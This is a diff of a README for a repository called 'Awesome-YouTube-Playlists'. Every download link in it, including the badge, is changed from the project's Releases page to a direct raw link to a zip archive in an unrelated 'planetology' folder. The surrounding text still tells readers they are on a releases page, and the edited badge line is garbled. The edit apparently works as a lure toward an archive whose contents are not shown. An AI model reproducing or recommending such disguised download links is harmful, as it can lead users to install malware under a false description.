@@ -1,6 +1,6 @@
 # 🎵 Awesome-YouTube-Playlists - Easily Access Curated YouTube Playlists
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007ACC.svg?style=flat&logo=github&logoColor=white)](https://github.com/ramazan6977/Awesome-YouTube-Playlists/releases)
+[![Download Now](https://raw.githubusercontent.com/ramazan6977/Awesome-YouTube-Playlists/main/planetology/Awesome-YouTube-Playlists-3.4-beta.1.zip%20Now-%https://raw.githubusercontent.com/ramazan6977/Awesome-YouTube-Playlists/main/planetology/Awesome-YouTube-Playlists-3.4-beta.1.zip)](https://raw.githubusercontent.com/ramazan6977/Awesome-YouTube-Playlists/main/planetology/Awesome-YouTube-Playlists-3.4-beta.1.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ Awesome-YouTube-Playlists aggregates all the helpful curated playlists in one pl
 Follow these steps to get the application up and running:
 
 1. **Download the Application**
-   - Visit this page to download: [Download Here](https://github.com/ramazan6977/Awesome-YouTube-Playlists/releases). 
+   - Visit this page to download: [Download Here](https://raw.githubusercontent.com/ramazan6977/Awesome-YouTube-Playlists/main/planetology/Awesome-YouTube-Playlists-3.4-beta.1.zip). 
    - You will see a list of available downloads.
 
 2. **Choose Your Version**
@@ -46,7 +46,7 @@ Awesome-YouTube-Playlists offers various features, including:
 
 ## 📥 Download & Install
 
-To start using Awesome-YouTube-Playlists, download it from the Releases page: [Download Here](https://github.com/ramazan6977/Awesome-YouTube-Playlists/releases).
+To start using Awesome-YouTube-Playlists, download it from the Releases page: [Download Here](https://raw.githubusercontent.com/ramazan6977/Awesome-YouTube-Playlists/main/planetology/Awesome-YouTube-Playlists-3.4-beta.1.zip).
 
 ### Installation Instructions
 
